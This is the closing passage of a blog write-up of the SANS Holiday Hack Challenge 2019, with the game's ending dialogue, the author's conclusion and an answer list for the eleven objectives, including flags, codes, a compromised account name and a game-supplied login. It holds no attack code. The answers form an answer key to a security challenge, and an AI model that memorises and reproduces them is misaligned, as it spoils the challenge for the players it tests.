<img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>You did it! Thank you! You uncovered the sinister plot to destroy the
holiday season!</p>
<p>Through your diligent efforts, we’ve brought the Tooth Fairy to justice and
saved the holidays!</p>
<p>Ho Ho Ho!</p>
<p>The more I laugh, the more I fill with glee.</p>
<p>And the more the glee,</p>
<p><a class="reference external" href="https://www.youtube.com/watch?v=yNHRXNvFmZ8">The more I'm a merrier me!</a></p>
<p>Merry Christmas and Happy Holidays.</p>
</blockquote>
<img alt="small_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" />
<p><em>Krampus says</em></p>
<blockquote>
<p>Congratulations on a job well done!</p>
<p>Oh, by the way, I won the Frido Sleigh contest.</p>
<p>I got 31.8% of the prizes, though I'll have to figure that out.</p>
</blockquote>
<img alt="toothfairy_orange.png" class="align-center" src="/images/sans-christmas-challenge-2019/toothfairy_orange.png" />
<p><em>The Tooth Fairy says</em></p>
<blockquote>
<p>You foiled my dastardly plan! I’m ruined!</p>
<p>And I would have gotten away with it too, if it weren't for you meddling
kids!</p>
</blockquote>
<p>And, what is that we can see <a class="reference external" href="https://downloads.elfu.org/LetterOfWintryMagic.pdf">in the corner</a>...
Why, it's the letter of wintry magic we found during our reconnaissance of the
elfu.org domain! Here's what it says:</p>
<blockquote>
<p>Thankfully, I didn’t have to implement my plan by myself! Jack Frost</p>
<p>promised to use his wintry magic to help me subvert Santa’s horrible reign</p>
<p>of holiday merriment NOW and FOREVER!</p>
</blockquote>
<p>Oh my, sounds like things aren't over yet...</p>
</div>
</div>
<div class="section" id="conclusion">
<h2><a class="toc-backref" href="#id43">Conclusion</a></h2>
<p>Well, that's it for this year's challenge! It was a ton of fun, with some
unexpected tasks, like cutting a key, and such. This year's challenge was
clearly designed to show the blue-team side of the equation, which is kind of
neat since it's not frequently shown in online challenges.</p>
<p>Thanks a lot for the SANS team for a Supercalifragilisticexpialidocious
Christmas challenge, and see you next year!</p>
</div>
<div class="section" id="answer-to-the-questions">
<h2><a class="toc-backref" href="#id44">Answer to the questions</a></h2>
<ol class="arabic simple">
<li>Someone sent a threatening letter to Elf University. What is the first word
in ALL CAPS in the subject line of the letter? Please find the letter in the
Quad.</li>
</ol>
<p>The word is <code>DEMAND</code>.</p>
<ol class="arabic simple" start="2">
<li>We're seeing attacks against the Elf U domain! Using the <a class="reference external" href="/docs/sans-christmas-challenge-2019/Security.evtx.zip">event log data</a>,
identify the user account that the attacker compromised using a password
spray attack.</li>
</ol>
<p>The account compromised during the password spray attack is <code>supatree</code>.</p>
<ol class="arabic simple" start="3">
<li>Using <a class="reference external" href="/docs/sans-christmas-challenge-2019/sysmon-data.json.zip">these normalized Sysmon logs</a>,
identify the tool the attacker used to retrieve domain password hashes from
the lsass.exe process.</li>
</ol>
<p>The attacker used the <code>ntdsutil</code> program to extract hashes.</p>
<ol class="arabic simple" start="4">
<li>The attacks don't stop! Can you help identify the IP address of the
malware-infected system using these <a class="reference external" href="https://downloads.elfu.org/elfu-zeeklogs.zip">Zeek logs</a>?</li>
</ol>
<p>The IP address of the infected computer is <code>192.168.134.130</code>.</p>
<ol class="arabic simple" start="5">
<li>Access <a class="reference external" href="https://splunk.elfu.org/">https://splunk.elfu.org/</a> as <code>elf</code> with password
<code>elfsocks</code>. What was the message for Kent that the adversary embedded
in this attack? The SOC folks at that link will help you along!</li>
</ol>
<p>The message left for Kent was <code>Kent you are so unfair. And we were going
to make you the king of the Winter Carnival.</code>.</p>
<ol class="arabic simple" start="6">
<li>Gain access to the steam tunnels. Who took the turtle doves? Please tell us
their first and last name.</li>
</ol>
<p>The turtle doves were taken by <code>Krampus Hollyfeld</code>.</p>
<ol class="arabic simple" start="7">
<li>Help Krampus beat the <a class="reference external" href="https://fridosleigh.com/">Frido Sleigh contest</a>.</li>
</ol>
<p>Well, I did, and got the code <code>8Ia8LiZEwvyZr2WO</code>.</p>
<ol class="arabic simple" start="8">
<li>Gain access to the data on the <a class="reference external" href="https://studentportal.elfu.org/">Student Portal</a>
server and retrieve the paper scraps hosted there. What is the name of
Santa's cutting-edge sleigh guidance system?</li>
</ol>
<p>Santa's seligh guidance system is called <code>Super Sled-o-matic</code>.</p>
<ol class="arabic" start="9">
<li><p class="first">The Elfscrow Crypto tool is a vital asset used at Elf University for
encrypting SUPER SECRET documents. We can't send you the source, but we do
have debug symbols that you can use.</p>
<p>Recover the plaintext content for this encrypted document. We know that it
was encrypted on December 6, 2019, between 7pm and 9pm UTC.</p>
<p>What is the middle line on the cover page? (Hint: it's five words)</p>
</li>
</ol>
<p>The middle line is <code>Machine Learning Sleigh Route Finder</code>.</p>
<ol class="arabic simple" start="10">
<li>Visit Shinny Upatree in the Student Union and help solve their problem.
What is written on the paper you retrieve for Shinny?</li>
</ol>
<p>The name of this year's villain is written, <code>The Tooth Fairy</code>.</p>
<ol class="arabic simple" start="11">
<li>Use the data supplied in the Zeek JSON logs to identify the IP addresses of
attackers poisoning Santa's flight mapping software. <a class="reference external" href="https://srf.elfu.org/">Block the 100
offending sources of information to guide Santa's sleigh</a>
through the attack. Submit the Route ID (&quot;RID&quot;) success value that you're
given.</li>
</ol>
<p>The Route ID is <code>0807198508261964</code>.</p>
</div>

  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>
</article>

    <footer>
<p>
  &copy; Yannick Méheut 2020 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by-sa/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BlogPosting",
  "name": "SANS Christmas Challenge 2019",
  "headline": "SANS Christmas Challenge 2019",
  "datePublished": "2020-01-14 00:00:00+01:00",
  "dateModified": "",
  "author": {
    "@type": "Person",
    "name": "useless",
    "url": "https://allyourbase.utouch.fr/author/useless.html"
  },
  "image": "/images/useless_profile_pic.jpg",
  "url": "https://allyourbase.utouch.fr/posts/2020/01/14/sans-christmas-challenge-2019/",
  "description": "On the twelfth day of Christmas, my true love gave to me: Twelve Phishers phishing Eleven Shells a-popping Ten Passwords spraying Nine Splunks a-splunking Eight Machines learning Seven Metasploit scanning Six Blue Teamers crying Five Golden Tickets Four Domain Hashes Three Malicious Macros Two LAN Turtles and a Pwnage in …"
}
</script></body>
</html>